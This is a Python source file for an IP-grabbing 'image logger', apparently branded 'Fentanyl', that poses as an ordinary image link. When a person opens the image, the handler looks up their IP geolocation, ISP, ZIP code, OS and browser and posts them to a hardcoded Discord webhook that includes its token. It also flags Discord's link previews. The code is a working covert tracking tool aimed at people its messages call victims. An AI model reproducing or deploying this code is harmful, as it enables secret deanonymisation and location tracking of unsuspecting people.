from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1454482941466902660/KRrwZeaJpgcDp_t_BRfio3JSyrLPuTkNni385wbFCYAkF5_HPBO4AGg30_Zu-K5UcDCq'

bindata = httpx.get('data:image/jpeg;base64,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').content
buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
